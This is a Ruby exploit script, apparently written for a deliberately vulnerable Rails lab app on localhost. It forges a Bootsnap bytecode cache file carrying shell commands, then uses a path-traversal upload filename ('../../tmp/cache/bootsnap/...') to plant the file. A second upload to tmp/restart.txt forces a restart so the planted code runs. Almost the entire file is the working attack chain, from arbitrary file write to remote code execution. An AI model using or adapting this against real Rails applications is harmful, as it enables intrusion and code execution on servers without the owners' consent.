require 'uri'
require 'cgi'
require 'json'
require 'zlib'
require 'httparty'
require 'tempfile'
require 'nokogiri'
require 'fileutils'

def fnv1a_64(data)
  # FNV-1a 64-bit hash function for a given string
  h = 0xcbf29ce484222325
  data.each_byte do |byte|
    h ^= byte
    h = (h * 0x100000001b3) & 0xFFFFFFFFFFFFFFFF  # Keep it within 64 bits
  end
  h
end

def bs_cache_path(cachedir, path)
  # Generate cache path based on FNV-1a hash
  hash_value = fnv1a_64(path)
  first_byte = (hash_value >> (64 - 8)) & 0xFF
  remainder = hash_value & 0x00FFFFFFFFFFFFFF
  File.join(cachedir, "%02x" % first_byte, "%014x" % remainder)
end

def hash_32(data)
  fnv1a_64(data) >> 32
end

def extract_csrf_and_cookie(url)
  uri = URI.parse(url)
  response = Net::HTTP.get_response(uri)

  # Parse the HTML response to extract the CSRF token
  doc = Nokogiri::HTML(response.body)
  csrf_token = doc.at('meta[name="csrf-token"]')&.[]('content')

  # Extract the session cookie from the response headers
  session_cookie = response.get_fields('set-cookie')&.find { |cookie| cookie.start_with?('_vulnerable_app_session') }

  { csrf_token: csrf_token, session_cookie: session_cookie }
end

def send_post_request(url, filename, content, csrf_token, session_cookie)
  # Create a temporary file
  temp_file = Tempfile.new()
  temp_file.write(content)
  temp_file.rewind

  # Prepare headers
  headers = {
    'User-Agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Accept' => 'application/json',
    'Cookie' => session_cookie
  }

  # Prepare the multipart form data
  form_data = {
    'authenticity_token' => csrf_token,
    'file' => temp_file,
    'filename' => filename
  }

  # Send the POST request with multipart data
  response = HTTParty.post(url, 
                           body: form_data,
                           headers: headers,
                           multipart: true)

  # Output the response
  puts "Response Code: #{response.code}"
  puts "Response Body: #{response.body}"

  # Clean up the temporary file
  temp_file.close
  temp_file.unlink
end

def generate_evil_cache(cache_path, ruby_info)
  require_target = ruby_info[:require_target]
  payload = <<~PAYLOAD
    `id >&2`
    `rm -f #{cache_path}`
    load("#{require_target}")
  PAYLOAD

  compiled_binary = RubyVM::InstructionSequence.compile(payload).to_binary

  cache_key = generate_cache_key(ruby_info, compiled_binary.size)

  # Write binary data and compiled binary to file
  malicious_path = '/tmp/output_file.bin'
  write_binary_file(malicious_path, cache_key, compiled_binary)

  puts "File written to #{malicious_path}"
  malicious_path
end

def generate_cache_key(ruby_info, data_size)
  {
    version:         6, # for v1.18.4. Depends on bootsnap version
    ruby_platform:   hash_32("x86_64-linux"),
    compile_option:  Zlib.crc32(ruby_info[:compile_option]),
    ruby_revision:   hash_32(ruby_info[:revision]),
    size:            ruby_info[:size],
    mtime:           ruby_info[:mtime],
    data_size:       data_size,
    digest:          31337,
    digest_set:      1,
    pad:             "\0" * 15
  }
end

def write_binary_file(path, cache_key, binary_data)
  File.open(path, 'wb') do |file|
    file.write(pack_cache_key(cache_key))
    file.write(binary_data)
  end
end

def pack_cache_key(cache_key)
  [
    cache_key[:version],
    cache_key[:ruby_platform],
    cache_key[:compile_option],
    cache_key[:ruby_revision],
    cache_key[:size],
    cache_key[:mtime],
    cache_key[:data_size],
    cache_key[:digest],
    cache_key[:digest_set],
    *cache_key[:pad]
  ].pack('L4Q4C1a15')
end

def main
  ruby_db = JSON.parse(File.read("ruby_database.json"), symbolize_names: true)

  ruby_db.each do |ruby_info|
    puts "Trying Ruby #{ruby_info[:version]}"

    cachedir = "tmp/cache/bootsnap/compile-cache-iseq"
    cache_path = bs_cache_path(cachedir, ruby_info[:require_target])
    puts "Cache path: #{cache_path}"

    evil_cache = generate_evil_cache(cache_path, ruby_info)

    csrf_and_cookie = extract_csrf_and_cookie('http://localhost:3000/upload_form')
    if csrf_and_cookie[:csrf_token] && csrf_and_cookie[:session_cookie]
      filename = "../../#{cache_path}"
      file_content = File.binread(evil_cache)

      send_post_request('http://localhost:3000/upload', filename, file_content, csrf_and_cookie[:csrf_token], csrf_and_cookie[:session_cookie])

      # Restart
      send_post_request('http://localhost:3000/upload', "../../tmp/restart.txt", "", csrf_and_cookie[:csrf_token], csrf_and_cookie[:session_cookie])

      sleep(5)
    else
      puts "Failed to extract CSRF token and/or session cookie."
    end
  end
end

main

